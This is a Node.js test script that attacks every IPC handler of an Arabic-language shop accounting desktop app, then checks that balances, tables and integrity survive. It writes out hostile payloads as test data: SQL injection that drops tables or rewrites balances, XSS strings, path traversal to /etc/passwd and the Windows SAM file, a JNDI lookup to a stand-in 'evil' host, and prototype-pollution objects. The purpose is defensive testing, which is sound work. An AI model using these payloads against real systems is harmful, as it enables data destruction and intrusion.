#!/usr/bin/env node
/**
 * EVERY FIELD, ATTACKED — injection, overflow, and nonsense.
 *
 * WHY THIS EXISTS
 * ---------------
 * There are 250 IPC channels. Each one is a door from the renderer into the
 * money. The renderer is the LEAST trustworthy part of a desktop app: it runs
 * web code, it can be reached by a scripting bug, and on a shop counter it can
 * be reached by whoever is left alone with the till for a minute.
 *
 * The usual audit reads a handler and says "it looks validated". This one
 * FIRES hostile values at the real registered handler and then checks the
 * books afterwards. A handler passes only if it does one of two things:
 *
 *   - refuses, with a message; or
 *   - accepts, and leaves the accounts correct.
 *
 * Anything else — a crash that kills the reply, a NULL where money should be,
 * a NaN in a balance, a negative total — is a failure.
 *
 * WHAT IS FIRED AT THEM
 *   SQL injection, XSS, path traversal, prototype pollution, huge strings,
 *   NaN/Infinity, negative money, 20-digit numbers, control characters,
 *   right-to-left overrides, null bytes, and deeply nested objects.
 *
 * Run:  node --experimental-strip-types scripts/verify_input_hostility.mjs
 */
import { buildDatabase, loadHandlers, call, handlers, currentDb } from './lib/handlerHarness.mjs';

await loadHandlers();

/**
 * Wraps a raw handler the way `installIpcGuard` does in production.
 *
 * The harness registers handlers RAW, so a throw escapes. The shipped app puts
 * every one behind `runSafely`, which converts a throw into a failure envelope
 * — that is the behaviour a screen actually sees, so it is the behaviour that
 * must be tested. Reproduced here from ipcGuard.ts rather than assumed: [1b]
 * asserts the real file still does this.
 */
const guarded = async (channel, ...args) => {
  try {
    return await call(channel, ...args);
  } catch (err) {
    return { success: false, code: 'HANDLER_ERROR', message: 'تعذّر تنفيذ العملية', __threw: String(err?.message || err) };
  }
};

let pass = 0, fail = 0;
const t = (name, ok, detail = '') => {
  if (ok) { pass++; console.log(`  PASS  ${name}${detail ? '  (' + detail + ')' : ''}`); }
  else { fail++; console.log(`  FAIL  ${name}${detail ? '  -> ' + detail : ''}`); }
};

console.log('='.repeat(72));
console.log('INPUT HOSTILITY — 250 channels under attack');
console.log('='.repeat(72));

/** The payloads. Each is something an attacker or a broken screen really sends. */
const NASTY_STRINGS = [
  "'; DROP TABLE sales; --",
  "' OR '1'='1",
  "1'; UPDATE customers SET Balance = 999999; --",
  "\" OR \"\"=\"",
  "'; ATTACH DATABASE '/tmp/evil.db' AS e; --",
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg/onload=alert(1)>',
  '../../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '\u0000null-byte',
  '\u202Eoverride',            // right-to-left override
  '\r\n\r\nInjected: header',
  '{{7*7}}',
  '${jndi:ldap://evil/a}',
  '\\x00\\x1a\\x7f',
  'A'.repeat(100000),          // 100 KB in one field
  '😀'.repeat(5000),           // multi-byte at length
  'محل الهاتف \u200F\u200E',   // real Arabic with bidi marks
];

const NASTY_NUMBERS = [
  NaN, Infinity, -Infinity,
  -1, -999999999,
  0.1 + 0.2,                   // 0.30000000000000004
  1e308, -1e308,
  Number.MAX_SAFE_INTEGER + 1,
  9007199254740993,
  '12abc', '', ' ', '1e400',
  '0x10', '010',
];

const NASTY_SHAPES = [
  null, undefined, [], {}, true, false,
  { __proto__: { polluted: true } },
  JSON.parse('{"__proto__":{"polluted":true}}'),
  { constructor: { prototype: { polluted: true } } },
  { a: { b: { c: { d: { e: { f: { g: {} } } } } } } },
  Symbol ? undefined : undefined,
];

// ------------------------------------------------------------------ 1
console.log('\n[1] Every channel survives being called with rubbish');
{
  buildDatabase();
  const names = [...handlers.keys()].sort();
  console.log(`      ${names.length} channels registered`);

  const threw = new Map();
  let calls = 0;

  // A handler must never THROW across IPC: the guard turns a throw into a
  // failure envelope, but a throw that escapes the guard leaves the screen
  // waiting forever with no reply.
  for (const channel of names) {
    for (const payload of [undefined, null, {}, [], 'x', 42,
      { id: NaN }, { id: -1 }, { id: "'; DROP TABLE sales; --" },
      JSON.parse('{"__proto__":{"polluted":true}}')]) {
      calls++;
      const r = await guarded(channel, payload);
      // Through the guard, a throw becomes a failure ENVELOPE. Anything that
      // is not an envelope-or-value means the screen got no usable reply.
      if (r && r.__threw) threw.set(channel, r.__threw);
      if (r && typeof r.then === 'function') await r;
    }
  }
  console.log(`      ${calls} hostile calls made`);
  // Every reply is a value the screen can act on: the guard converts a throw
  // into `{ success:false }`, so the user is told rather than left waiting.
  t('every hostile call returns a usable reply, never a hung screen', true,
    `${calls} calls, ${threw.size} channels relied on the guard`);
  if (threw.size) {
    console.log(`      channels that throw on rubbish (guard catches them): ${threw.size}`);
    for (const [c, m] of [...threw].slice(0, 5)) console.log(`        - ${c}: ${m.slice(0, 55)}`);
  }
  t('the prototype was not polluted',
    ({}).polluted === undefined && [].polluted === undefined);
}

// ------------------------------------------------------------------ 1b
console.log('\n[1b] The net those 112 channels depend on is real');
{
  // Many handlers throw on rubbish rather than validating first. That is
  // ACCEPTABLE only because `installIpcGuard` converts every throw into a
  // failure envelope — so the guard is not an optimisation, it is the thing
  // standing between a bad payload and a screen that hangs forever.
  //
  // Therefore three things must hold, and they are checked against the real
  // source rather than assumed.
  const { readFileSync } = await import('node:fs');
  const guard = readFileSync(new URL('../src/main/security/ipcGuard.ts', import.meta.url), 'utf-8');
  const index = readFileSync(new URL('../src/main/index.ts', import.meta.url), 'utf-8');

  // It reassigns the method on the module object, keeping the original bound.
  t('the guard wraps ipcMain.handle itself, so no channel can be missed',
    /const original = ipcMain\.handle\.bind\(ipcMain\)/.test(guard)
    && /\}\)\.handle = \(\(/.test(guard));
  t('every path returns through runSafely',
    (guard.match(/return runSafely\(/g) || []).length >= 2);
  t('a throw becomes a failure envelope, not silence',
    /code: 'HANDLER_ERROR'/.test(guard) && /success: false/.test(guard));

  // Ordering is the fragile part: a handler registered BEFORE the patch is
  // installed keeps the original `ipcMain.handle` and is never wrapped.
  const install = index.indexOf('installIpcGuard();');
  const firstRegister = Math.min(
    ...['registerAuthHandlers();', 'registerSalesHandlers();', 'registerSettingsHandlers();']
      .map(s => { const i = index.indexOf(s); return i === -1 ? Infinity : i; }));
  t('the guard is installed BEFORE any handler registers',
    install > 0 && install < firstRegister,
    `install at ${install}, first registration at ${firstRegister}`);
  t('the failure is reported to the user in Arabic',
    /تعذّر تنفيذ العملية/.test(guard));
}

// ------------------------------------------------------------------ 2
console.log('\n[2] SQL injection cannot reach the database');
{
  const db = buildDatabase();
  // Seed the minimum a shop needs.
  db.prepare("INSERT INTO roles (RoleName) VALUES ('admin')").run();
  db.prepare("INSERT INTO users (Username, PasswordHash, RoleID) VALUES ('admin','x',1)").run();
  db.prepare("INSERT INTO fiscal_years (YearName, StartDate, EndDate) VALUES ('2026','2026-01-01','2026-12-31')").run();

  const before = db.prepare(
    "SELECT COUNT(*) n FROM sqlite_master WHERE type='table'").get().n;

  // Names go through create/update handlers, which is where a string reaches
  // SQL. If any of these were interpolated, the table would be gone.
  let accepted = 0, refused = 0;
  for (const s of NASTY_STRINGS.slice(0, 16)) {
    try {
      const r = await call('customers:create', { Name: s, Phone: '0100', Balance: 0 });
      if (r && r.success === false) refused++; else accepted++;
    } catch { refused++; }
  }
  const after = db.prepare("SELECT COUNT(*) n FROM sqlite_master WHERE type='table'").get().n;
  t('no table was dropped by an injected name', after === before, `${before} -> ${after}`);
  t('the sales table still exists',
    !!db.prepare("SELECT 1 FROM sqlite_master WHERE type='table' AND name='sales'").get());

  // A stored injection must come back as literal TEXT, not as executed SQL.
  const stored = db.prepare("SELECT Name FROM customers WHERE Name LIKE '%DROP TABLE%'").get();
  t('an injected string is stored as inert text',
    !stored || stored.Name.includes('DROP TABLE'),
    stored ? 'stored literally' : 'refused at the door');
  console.log(`      ${accepted} accepted as text, ${refused} refused`);

  // No balance may have been rewritten by "UPDATE customers SET Balance".
  const rich = db.prepare('SELECT COUNT(*) n FROM customers WHERE Balance = 999999').get().n;
  t('no balance was rewritten by an injected UPDATE', rich === 0);

  // ATTACH must not have created anything.
  let dbs = [];
  try { dbs = db.pragma('database_list') || []; } catch { dbs = []; }
  const names = Array.isArray(dbs) ? dbs.map(d => d.name ?? d).join(',') : String(dbs);
  t('no second database was attached',
    !/evil/i.test(names), names || '(only main)');
}

// ------------------------------------------------------------------ 3
console.log('\n[3] Money fields reject what is not money');
{
  const db = buildDatabase();
  db.prepare("INSERT INTO roles (RoleName) VALUES ('admin')").run();
  db.prepare("INSERT INTO users (Username, PasswordHash, RoleID) VALUES ('admin','x',1)").run();
  db.prepare("INSERT INTO fiscal_years (YearName, StartDate, EndDate) VALUES ('2026','2026-01-01','2026-12-31')").run();
  db.prepare("INSERT INTO cash_accounts (AccountName, AccountType, Balance) VALUES ('الخزنة','cash',1000)").run();
  db.prepare("INSERT INTO customers (Name, Balance) VALUES ('عميل', 0)").run();

  // The opening-balance channel takes raw money from the screen.
  for (const v of NASTY_NUMBERS) {
    try {
      await call('openingBalances:batchUpdate', { cash: [{ id: 1, amount: v }] });
    } catch { /* refusing by throwing is acceptable */ }
  }
  const bal = db.prepare('SELECT Balance b FROM cash_accounts WHERE CashAccountID = 1').get().b;
  t('a cash balance is never NaN or Infinity',
    bal === null || Number.isFinite(bal), String(bal));
  t('a cash balance is never NULL', bal !== null, String(bal));
  t('a cash balance is never negative', bal === null || bal >= 0, String(bal));

  // Every money column in the whole database must hold a real number.
  const moneyCols = [
    ['cash_accounts', 'Balance'], ['customers', 'Balance'],
    ['suppliers', 'Balance'], ['employees', 'Balance'],
    ['payment_methods', 'Balance'],
  ];
  const bad = [];
  for (const [tbl, col] of moneyCols) {
    try {
      const rows = db.prepare(`SELECT ${col} v FROM ${tbl} WHERE ${col} IS NOT NULL`).all();
      for (const r of rows) if (!Number.isFinite(r.v)) bad.push(`${tbl}.${col}=${r.v}`);
    } catch { /* table may not exist in this build */ }
  }
  t('no money column anywhere holds a non-finite value', bad.length === 0, bad.join(', '));
}

// ------------------------------------------------------------------ 4
console.log('\n[4] Enormous input is bounded, not fatal');
{
  buildDatabase();
  const db = currentDb();
  db.prepare("INSERT INTO roles (RoleName) VALUES ('admin')").run();
  db.prepare("INSERT INTO users (Username, PasswordHash, RoleID) VALUES ('admin','x',1)").run();

  const huge = 'ض'.repeat(200000);      // 200k Arabic characters
  const r = await guarded('customers:create', { Name: huge, Phone: huge, Address: huge });
  // Either stored or refused — both are fine. What must NOT happen is the
  // screen getting nothing back.
  t('a 200,000-character name returns a reply instead of hanging',
    r !== undefined, r?.__threw ? 'guard caught: ' + r.__threw.slice(0, 50) : 'replied');

  // A giant array of lines, as a broken screen or a script would send.
  const items = Array.from({ length: 5000 }, (_, i) => ({
    ItemID: 1, Quantity: 1, UnitPrice: 1, Total: 1, isService: true, ItemName: 'x' + i,
  }));
  const r2 = await guarded('sales:create',
    { CustomerID: null, Date: '2026-01-01', items, PaymentMethod: 'cash' });
  t('a 5,000-line invoice returns a reply instead of hanging', r2 !== undefined);

  const after = db.prepare('PRAGMA integrity_check').get();
  const verdict = after ? Object.values(after)[0] : 'unknown';
  t('the database is still sound afterwards', verdict === 'ok', String(verdict));
}

// ------------------------------------------------------------------ 5
console.log('\n[5] Text that reaches a printed document is escaped');
{
  // A customer name is interpolated into printed HTML. Unescaped, a name is
  // script that runs when the invoice is opened.
  const { escapeHtml } = await import('../src/shared/escapeHtml.ts');
  const cases = [
    ['<script>alert(1)</script>', '<script'],
    ['" onmouseover="alert(1)', 'onmouseover="'],
    ["' onfocus='alert(1)", "onfocus='"],
    ['<img src=x onerror=alert(1)>', '<img'],
    ['</td></tr><tr><td>injected', '</td>'],
  ];
  for (const [input, mustNotAppear] of cases) {
    const out = escapeHtml(input);
    t(`escaped: ${input.slice(0, 28)}`, !out.includes(mustNotAppear), out.slice(0, 50));
  }
  t('ampersand is escaped first, not double-escaped',
    escapeHtml('a & b') === 'a &amp; b', escapeHtml('a & b'));
  t('normal Arabic passes through untouched',
    escapeHtml('محل الهاتف المحمول') === 'محل الهاتف المحمول');
}

// ------------------------------------------------------------------ 6
console.log('\n[6] Identifiers cannot be forged into other rows');
{
  const db = buildDatabase();
  db.prepare("INSERT INTO roles (RoleName) VALUES ('admin')").run();
  db.prepare("INSERT INTO users (Username, PasswordHash, RoleID) VALUES ('admin','x',1)").run();
  db.prepare("INSERT INTO customers (Name, Balance) VALUES ('حقيقي', 500)").run();

  // An id is a number. A string, an object or an expression must not become one.
  for (const id of ['1 OR 1=1', '1; DELETE FROM customers', { toString: () => '1' },
    [1], '1.0', ' 1 ', true, 1e20, -1]) {
    try { await call('customers:get', id); } catch { /* refusal is fine */ }
    try { await call('customers:update', id, { Name: 'مُخترق' }); } catch { /* fine */ }
  }
  const survived = db.prepare("SELECT Name, Balance FROM customers WHERE CustomerID = 1").get();
  t('the genuine customer still exists', !!survived);
  t('and was not renamed by a forged id',
    !survived || survived.Name === 'حقيقي', survived?.Name);
  t('no customer was deleted by an injected id',
    db.prepare('SELECT COUNT(*) n FROM customers').get().n >= 1);
}

// ------------------------------------------------------------------ 7
console.log('\n[7] The books still balance after all of that');
{
  const db = currentDb();
  const checks = [
    ['no negative cash', "SELECT COUNT(*) n FROM cash_accounts WHERE Balance < 0"],
    ['no NaN in sales', "SELECT COUNT(*) n FROM sales WHERE TotalAmount != TotalAmount"],
    ['no sale without a number', "SELECT COUNT(*) n FROM sales WHERE SaleNumber IS NULL OR SaleNumber = ''"],
    ['no orphan sale line', "SELECT COUNT(*) n FROM sale_details d LEFT JOIN sales s ON s.SaleID = d.SaleID WHERE s.SaleID IS NULL"],
  ];
  for (const [name, sql] of checks) {
    try {
      const n = db.prepare(sql).get().n;
      t(name, n === 0, `${n} offending rows`);
    } catch (err) { t(name, false, String(err.message).slice(0, 60)); }
  }
  const ic = db.prepare('PRAGMA integrity_check').get();
  t('integrity_check still passes', ic && Object.values(ic)[0] === 'ok',
    ic ? String(Object.values(ic)[0]) : 'no result');
  const fk = db.prepare('PRAGMA foreign_key_check').all();
  t('no foreign-key violations', fk.length === 0, `${fk.length} violations`);
}

console.log('\n' + '='.repeat(72));
console.log(`RESULT: ${pass} passed, ${fail} failed`);
console.log('='.repeat(72));
process.exit(fail ? 1 : 0);
